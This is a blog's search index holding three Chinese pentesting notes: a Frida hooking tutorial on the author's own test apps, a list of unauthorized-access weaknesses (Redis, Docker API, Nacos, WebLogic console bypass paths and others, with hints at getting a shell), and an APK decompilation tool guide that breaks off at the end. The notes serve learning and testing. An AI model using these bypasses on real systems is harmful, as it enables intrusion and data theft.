<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>frida基础学习(1)</title>
    <link href="/2022/03/02/frida%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/03/02/frida%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="frida基础学习-1"><a href="#frida基础学习-1" class="headerlink" title="frida基础学习(1)"></a>frida基础学习(1)</h2><h4 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h4><p>pc安装frida</p><p>frida-tools要选择与frida相匹配版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip3 install frida==版本号<br>pip3 install frida-tools==版本号 <br></code></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//frida/image-20220211115641448.png" alt="image-20220211115641448" style="zoom: 50%;" /><p>Android运行相应版本frida-server，版本要与frida版本一致，且选择对应系统架构</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//frida/image-20220211120036179.png" alt="image-20220211120036179"></p><p><a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a></p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//frida/image-20220211120128945.png" alt="image-20220211120128945" style="zoom:50%;" /><p>下载解压后push到Android端tmp目录下，运行，即可开始使用frida进行操作</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">adb</span> <span class="hljs-keyword">push</span> frida-server /<span class="hljs-meta">data</span>/local/tmp<br>./frida-server  <span class="hljs-comment">//Android端运行</span><br><span class="hljs-symbol">adb</span> forward tcp:<span class="hljs-number">27042</span> tcp:<span class="hljs-number">27043</span>  <span class="hljs-comment">//转发端口 </span><br></code></pre></td></tr></table></figure><p>​    在Android逆向过程中，Frida存在两种操作模式：一种是通过命令行直接将JavaScript脚本注入进<br>程中，对进程进行操作，称为CLI（命令行）模式；另一种是使用Python进行JavaScript脚本的注入工<br>作，实际对进程进行操作的还是JavaScript脚本，这种操作模式称为RPC模式。两种模式本质上是一样<br>的，最终执行Hook工作的都是JavaScript脚本，而且核心执行注入工作的还是Frida本身，只是RPC模<br>式在对复杂数据的处理上可以通过RPC传输给Python脚本来进行，这样有利于减少被注入进程的性能损<br>耗，在大规模调用中更加普遍。</p><p>Frida操作App的方式有两种。第一种是spwan模式，简而言之就是将启动App的权利交由Frida来<br>控制。采用这个模式时，即使目标App已经启动，在使用Frida注入程序时还是会重新启动App。在CLI<br>模式中，Frida通过加上-f参数指定包名以spwan模式操作App。第二种是attach模式，建立在目标App<br>已经启动的情况下，Frida通过ptrace注入程序从而执行Hook的操作。在CLI模式中，如果不添加-f参<br>数，则默认会通过attach模式注入App。</p><h4 id="2-frida脚本入门"><a href="#2-frida脚本入门" class="headerlink" title="2.frida脚本入门"></a>2.frida脚本入门</h4><h5 id="2-1认识frida脚本"><a href="#2-1认识frida脚本" class="headerlink" title="2.1认识frida脚本"></a>2.1认识frida脚本</h5><p>Frida脚本就是利用Frida动态插桩框架，使用Frida导出的API和方法对内存空间里的对象方法进行<br>监视、修改或者替换的一段代码。Frida的API是用JavaScript实现的，所以可以充分利用JavaScript的匿<br>名函数优势以及大量的Hook（钩子函数）和回调函数的API。</p><p>下例为注入android.process.media进程打印一条“hello world”</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">setTimeout(<br>    <span class="hljs-keyword">function</span> () &#123;<br>        Java.<span class="hljs-keyword">perform</span>(<span class="hljs-keyword">function</span> () &#123;<br>            console.log(&quot;hello world&quot;)<br>        &#125;)<br>    &#125;<br>)<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">frida -U xx<span class="hljs-selector-class">.xx</span><span class="hljs-selector-class">.xx</span> -l xx.js<br></code></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//frida/image-20220211152809639.png" alt="image-20220211152809639" style="zoom:80%;" /><h5 id="2-2-java层hook基础"><a href="#2-2-java层hook基础" class="headerlink" title="2.2 java层hook基础"></a>2.2 java层hook基础</h5><p>例1：下例为一简单hook练习：测试app会定期输出值至日志中，注入脚本hook此app中部分函数打印、修改输出值</p><p>app MainActivity：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.fridatest;<br><span class="hljs-keyword">import</span> androidx.appcompat.app. AppCompatActivity;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.util.Log;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AppCompatActivity</span></span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstancestate)</span></span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstancestate);<br>        setContentView(R.layout.activity_main);<span class="hljs-keyword">while</span>(<span class="hljs-keyword">true</span>)&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread.sleep(<span class="hljs-number">1000</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>            fun(<span class="hljs-number">50</span>,<span class="hljs-number">30</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fun</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x,<span class="hljs-keyword">int</span> y)</span></span>&#123;<br>        Log.d(<span class="hljs-string">&quot;r0ysue.sum&quot;</span>,String.valueOf(x+y));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>js脚本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;success&quot;</span>)<br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;inside&quot;</span>)<br>        <span class="hljs-keyword">var</span> MainActivity = Java.use(<span class="hljs-string">&#x27;com.example.fridatest.MainActivity&#x27;</span>)<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Java.Use.successfuly&quot;</span>)<br>        MainActivity.fun.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">x,y</span>)</span>&#123;<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;x=&gt;&quot;</span>,x,<span class="hljs-string">&quot;y=&gt;&quot;</span>,y)<br>            <span class="hljs-keyword">var</span> ret_value=<span class="hljs-built_in">this</span>.fun(x,y);<br>            <span class="hljs-keyword">return</span> ret_value<br>        &#125;<br>    &#125;)<br>&#125;<br>setImmediate(main)<br></code></pre></td></tr></table></figure><p>adb logcat查看输出</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">adb logcat <span class="hljs-string">|grep r0ysue</span><br></code></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//frida/image-20220211171954541.png" alt="image-20220211171954541" style="zoom: 67%;" /><p>hook后修改x,y的值</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//frida/image-20220215105619593.png" alt="image-20220215105619593" style="zoom:67%;" /><p>例2：当函数使用重载时，可在要hook的函数名后指定重载的函数进行hook</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-comment">//app MainActivity</span><br><span class="hljs-keyword">package</span> com.example.fridatest2;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.util.Log;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainActivity</span> <span class="hljs-title">extends</span> <span class="hljs-title">AppCompatActivity</span> </span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> void onCreate(Bundle savedInstanceState) &#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread.sleep(<span class="hljs-number">1000</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            <span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(<span class="hljs-number">50</span>, <span class="hljs-number">30</span>)</span></span>;<br>            Log.d(<span class="hljs-string">&quot;r0ysue.string&quot;</span>, <span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(<span class="hljs-string">&quot;LoweRcAsE Me ! ! ! ! ! ! ! ! ! &quot;</span>)</span></span>);<br>        &#125;<br>    &#125;<br><br>    void <span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(int x, int y)</span></span> &#123;<br>        Log.d(<span class="hljs-string">&quot;r0ysue.sum&quot;</span>, String.valueOf(x + y));<br>    &#125;<br><br>    String <span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(String x)</span></span> &#123;<br>        <span class="hljs-keyword">return</span> x.toLowerCase();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//hook js<br><span class="hljs-keyword">function</span> main() &#123;<br>    console.log(&quot;script success&quot;)<br>    Java.<span class="hljs-keyword">perform</span>(<span class="hljs-keyword">function</span> () &#123;<br>        console.log(&quot;inside&quot;)<br>        var MainAcitivity = Java.use(<span class="hljs-string">&#x27;com.example.fridatest2.MainActivity&#x27;</span>)<br>console.log(&quot;java success&quot;)<br>        MainAcitivity.fun.overload(<span class="hljs-string">&#x27;int&#x27;</span>,<span class="hljs-string">&#x27;int&#x27;</span>).implementation =<span class="hljs-keyword">function</span> (x,y) &#123; //指定函数<br>            console.log(&quot;x=&gt;&quot;,x,&quot;,y=&gt;&quot;,y)<br>            var ret_value =this.fun(<span class="hljs-number">2</span>,<span class="hljs-number">5</span>);<br>            <span class="hljs-keyword">return</span> ret_value<br>        &#125;<br>    &#125;)<br>&#125;<br>setImmediate(main)<br></code></pre></td></tr></table></figure><p>adb logcat查看输出</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//frida/image-20220215105725704.png" alt="image-20220215105725704" style="zoom:67%;" /><p>hook后修改x,y的值</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//frida/image-20220215105816630.png" alt="image-20220215105816630" style="zoom:67%;" /><h5 id="2-3-java层主动调用"><a href="#2-3-java层主动调用" class="headerlink" title="2.3 java层主动调用"></a>2.3 java层主动调用</h5><p>主动调用就是强制调用一个函数去执行。相对地，被动调用是由App按照正常逻辑去执行函数，函数的执行完全依靠与用户交互完成程序逻辑进而间接调用到关键函数，而主动调用则可以直接调用关键函数，主动性更强。</p><p>例3：下例增加了两个secret()函数：一个是没有static修饰的secret实例方法，一个是有static关键字修饰的staticSecret类方法</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//app MainActivity</span><br>package com.example.fridatest3;<br><br>import androidx.appcompat.app.AppCompatActivity;<br><br>import android.os.Bundle;<br>import android.util.Log;<br><br>public <span class="hljs-keyword">class</span> MainActivity extends AppCompatActivity &#123;<br><br>    @Override<br>    protected void on<span class="hljs-constructor">Create(Bundle <span class="hljs-params">savedInstanceState</span>)</span> &#123;<br>        super.on<span class="hljs-constructor">Create(<span class="hljs-params">savedInstanceState</span>)</span>;<br>        set<span class="hljs-constructor">ContentView(R.<span class="hljs-params">layout</span>.<span class="hljs-params">activity_main</span>)</span>;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Thread</span>.</span></span>sleep(<span class="hljs-number">1000</span>);<br>            &#125; catch (InterruptedException e) &#123;<br>                e.print<span class="hljs-constructor">StackTrace()</span>;<br>            &#125;<br>            <span class="hljs-keyword">fun</span>(<span class="hljs-number">50</span>, <span class="hljs-number">30</span>);<br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Log</span>.</span></span>d(<span class="hljs-string">&quot;r0ysue.string&quot;</span>, <span class="hljs-keyword">fun</span>(<span class="hljs-string">&quot;LoweRcAsE Me ! ! ! ! ! ! ! ! ! &quot;</span>));<br>        &#125;<br>    &#125;<br><br>    void <span class="hljs-keyword">fun</span>(<span class="hljs-built_in">int</span> x, <span class="hljs-built_in">int</span> y) &#123;<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Log</span>.</span></span>d(<span class="hljs-string">&quot;r0ysue.sum&quot;</span>, <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">String</span>.</span></span>value<span class="hljs-constructor">Of(<span class="hljs-params">x</span> + <span class="hljs-params">y</span>)</span>);<br>    &#125;<br><br>    String <span class="hljs-keyword">fun</span>(String x) &#123;<br>        return x.<span class="hljs-keyword">to</span><span class="hljs-constructor">LowerCase()</span>;<br>    &#125;<br>    void <span class="hljs-constructor">Secret()</span>&#123;<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Log</span>.</span></span>d(<span class="hljs-string">&quot;r0ysue.secret&quot;</span>,<span class="hljs-string">&quot;this is secret func&quot;</span>);<br>    &#125;<br>    static void static<span class="hljs-constructor">Secret()</span>&#123;<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Log</span>.</span></span>d(<span class="hljs-string">&quot;r0ysue.secret&quot;</span>,<span class="hljs-string">&quot;this is static secret func&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>logcat查看日志</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//frida/image-20220215141149506.png" alt="image-20220215141149506"></p><p>js脚本</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">function</span> main() &#123;<br>    console.log(&quot;script success&quot;)<br>    Java.<span class="hljs-keyword">perform</span>(<span class="hljs-keyword">function</span> () &#123;<br>        console.log(&quot;inside&quot;)<br>        //静态函数主动调用<br>        var MainActivity = Java.use(<span class="hljs-string">&#x27;com.example.fridatest3.MainActivity&#x27;</span>)<br>        MainActivity.staticSecret()<br>        //动态函数主动调用<br>        Java.choose(<span class="hljs-string">&#x27;com.example.fridatest3.MainActivity&#x27;</span>, &#123;<br>            onMatch:<span class="hljs-keyword">function</span>(instance)&#123;<br>                console.log(<span class="hljs-string">&#x27;instance found&#x27;</span>,instance)<br>                instance.Secret()<br>            &#125;,<br>            onComplete:<span class="hljs-keyword">function</span>()&#123;<br>console.log(<span class="hljs-string">&#x27;search complete&#x27;</span>)<br>        &#125;<br>        &#125;)<br>    &#125;)<br>&#125;<br>setImmediate(main)<br></code></pre></td></tr></table></figure><p>hook后主动调用函数</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//frida/image-20220225161119471.png" alt="image-20220225161119471"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>未授权访问总结</title>
    <link href="/2022/02/11/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93%20-%201/"/>
    <url>/2022/02/11/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93%20-%201/</url>
    
    <content type="html"><![CDATA[<h3 id="未授权访问总结"><a href="#未授权访问总结" class="headerlink" title="未授权访问总结"></a>未授权访问总结</h3><p>总结了测试时遇到的一些未授权访问（截图仅做演示，均非真实环境）</p><h5 id="1-redis未授权"><a href="#1-redis未授权" class="headerlink" title="1.redis未授权"></a>1.redis未授权</h5><p>默认端口6379，可能会被改成别的，直接redis-cli可连接</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">redis-<span class="hljs-keyword">cli</span> -h <span class="hljs-built_in">ip</span> -p port<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%20Unauthorized/image-20220121165254662.png" alt="image-20220121165254662"></p><p>linux写入计划任务、ssh公钥文件，windows写入启动项、mof文件等获取shell</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%20Unauthorized/image-20220121165822684.png" alt="image-20220121165822684"></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%20Unauthorized/image-20220121165834771.png" alt="image-20220121165834771"></p><h5 id="2-docker-api未授权"><a href="#2-docker-api未授权" class="headerlink" title="2.docker api未授权"></a>2.docker api未授权</h5><p>默认端口2375，访问此端口下/v1.23/containers/json目录或/version返回容器、版本信息可验证漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%20Unauthorized/image-20220121172935549.png" alt="image-20220121172935549"></p><p>未授权可直接进入容器，通过挂载目录写入公钥文件、计划任务可逃逸至宿主机</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%20Unauthorized/image-20220121173147922.png" alt="image-20220121173147922"></p><h5 id="3-VNC未授权"><a href="#3-VNC未授权" class="headerlink" title="3.VNC未授权"></a>3.VNC未授权</h5><p>vnc未授权可导致攻击者直接控制受控主机</p><p>直接使用vnc viewer连接即可</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%20Unauthorized/image-20220121175415478.png" alt="image-20220121175415478"></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%20Unauthorized/image-20220121175552935.png" alt="image-20220121175552935"></p><h5 id="4-Elasticsearch未授权访问"><a href="#4-Elasticsearch未授权访问" class="headerlink" title="4.Elasticsearch未授权访问"></a>4.Elasticsearch未授权访问</h5><p>Elasticsearch默认端口为9200、9300端口，直接浏览器访问即可未授权检索数据</p><p>使用ElasticHD可对未授权端口进行可视化管理</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%20Unauthorized/image-20220121195704556.png" alt="image-20220121195704556"></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%20Unauthorized/image-20220121195715118.png" alt="image-20220121195715118"></p><h5 id="5-zookeeper未授权访问"><a href="#5-zookeeper未授权访问" class="headerlink" title="5.zookeeper未授权访问"></a>5.zookeeper未授权访问</h5><p>ZooKeeper默认开启在2181端口，在未进行任何访问控制情况下，攻击者未授权连入，获取大量信息包括系统信息、环境等</p><p>利用可视化工具zoolnspector可对未授权端口进行连接</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%20Unauthorized/image-20220121200943028.png" alt="image-20220121200943028"></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%20Unauthorized/image-20220121201007566.png" alt="image-20220121201007566"></p><h5 id="6-Memcached未授权访问"><a href="#6-Memcached未授权访问" class="headerlink" title="6.Memcached未授权访问"></a>6.Memcached未授权访问</h5><p>Memcached是一种key-value缓存数据库，默认开启在11211端口，默认配置可未授权连接数据库获取信息</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%20Unauthorized/image-20220121201235709.png" alt="image-20220121201235709"></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%20Unauthorized/image-20220121201242744.png" alt="image-20220121201242744"></p><h5 id="7-Kibana-未授权访问"><a href="#7-Kibana-未授权访问" class="headerlink" title="7.Kibana 未授权访问"></a>7.Kibana 未授权访问</h5><p>默认端口为5601，直接访问<a href="http://ip:5601/app/kibana#/%E5%8D%B3%E5%8F%AF%E7%BB%95%E8%BF%87%E7%99%BB%E5%BD%95%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AE">http://ip:5601/app/kibana#/即可绕过登录直接访问</a></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%20Unauthorized/image-20220121202257878.png" alt="image-20220121202257878"></p><h5 id="8-Prometheus-监控系统未授权访问"><a href="#8-Prometheus-监控系统未授权访问" class="headerlink" title="8.Prometheus 监控系统未授权访问"></a>8.Prometheus 监控系统未授权访问</h5><p>默认配置可直接访问，泄露系统监控信息</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%20Unauthorized/image-20220121202505877.png" alt="image-20220121202505877"></p><h5 id="9-nacos-未授权"><a href="#9-nacos-未授权" class="headerlink" title="9.nacos 未授权"></a>9.nacos 未授权</h5><p>直接通过post传参数的形式即可无凭证未授权创建新的用户和密码</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%20Unauthorized/image-20220121203556124.png" alt="image-20220121203556124"></p><p>通过访问/nacos/v1/auth/users?pageNo=&amp;pageSize=路径可未授权查看username 和 password 的值</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%20Unauthorized/image-20220121203637234.png" alt="image-20220121203637234"></p><h5 id="10-Druid-Monitor-未授权访问"><a href="#10-Druid-Monitor-未授权访问" class="headerlink" title="10.Druid Monitor 未授权访问"></a>10.Druid Monitor 未授权访问</h5><p>直接在目标网站的url后加上：/druid/index.html，即可绕过登录访问到Druid监控界面</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%20Unauthorized/image-20220121204130542.png" alt="image-20220121204130542"></p><h5 id="11-Weblogic-Server-控制台未授权访问"><a href="#11-Weblogic-Server-控制台未授权访问" class="headerlink" title="11.Weblogic Server 控制台未授权访问"></a>11.Weblogic Server 控制台未授权访问</h5><p>低权限用户直接访问： <a href="http://ip:端口/console/images/%252E./console.portal即可未授权访问管理控制台">http://ip:端口/console/images/%252E./console.portal即可未授权访问管理控制台</a></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%20Unauthorized/image-20220121204631935.png" alt="image-20220121204631935"></p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>app反编译工具</title>
    <link href="/2021/12/30/app%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/"/>
    <url>/2021/12/30/app%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h2 id="反编译工具"><a href="#反编译工具" class="headerlink" title="反编译工具"></a>反编译工具</h2><p><a href="https://github.com/iBotPeaches/Apktool/">apktool</a>：解压文件的布局文件、图片资源以及dex文件。</p><p><a href="https://github.com/pxb1988/dex2jar/">dex2jar</a>：将APK反编译为java源码，dex2jar在实际应用当中往往无法直接反编译apk文件，由apktool获取到dex文件，然后用dex2jar将其转换得到jar文件。</p><p><a href="https://github.com/java-decompiler/jd-gui">jd-gui</a>：查看APK中classes.dex转化成出的jar文件，即源码文件。</p><p><a href="https://github.com/skylot/jadx/">jdax</a>：支持直接打开apk、dex、jar、class、smail、zip、aar、arsc文件。</p><p><a href="https://bitbucket.org/JesusFreke/smali/downloads/">smail.jar</a>：将smail文件编译成dex文件。指定smail文件时直接指定目录即可。</p><p><a href="https://bitbucket.org/JesusFreke/smali/downloads/">baksmail.jar</a>：将dex文件反编译成smail文件。</p><h2 id="apktool反编译app"><a href="#apktool反编译app" class="headerlink" title="apktool反编译app"></a>apktool反编译app</h2><p><strong>使用apktool解压APK文件</strong></p><p>将 apktool.bat 和 apktool.jar 文件放到同一文件夹下，在该文件夹下打开cmd窗口，执行以下命令</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>apktool.<span class="hljs-keyword">jar </span>-r d -f  xxx.apk  <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//Android/image-20211212215315932.png" alt="image-20211212215315932"></p><p>解压完成在当前目录下会生成有一个同名的文件夹，文件夹内部是解压出来的文件。</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//Android/image-20211212215358382.png" alt="image-20211212215358382"></p><p>文件夹内容如下，可以得到 xml、smali反汇编代码、res资源文件、assets配置文件、lib库文件</p><ul><li>classes.dex：java层的主要代码，即主程序</li><li>META-INF：签名和证书相关文件 ·</li><li>lib：native层的动态链接库文件（.so）目录，按照CPU架构作为子目录存放不同的so</li><li>assets：打包的静态文件，通常存放需要读取的图片、加密代码等等</li><li>res：资源目录</li><li>AndroidManifest.xml：配置文件，默认状态为编译后的二进制文件</li><li>resources.arsc： 资源配置文件，默认状态为编译后的二进制文件</li></ul><h2 id="打包app"><a href="#打包app" class="headerlink" title="打包app"></a>打包app</h2><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta"># java -jar apktool.jar b -f 要打包的文件夹路径 -o 输出的apk路径</span><br></code></pre></td></tr></table></figure><p><img 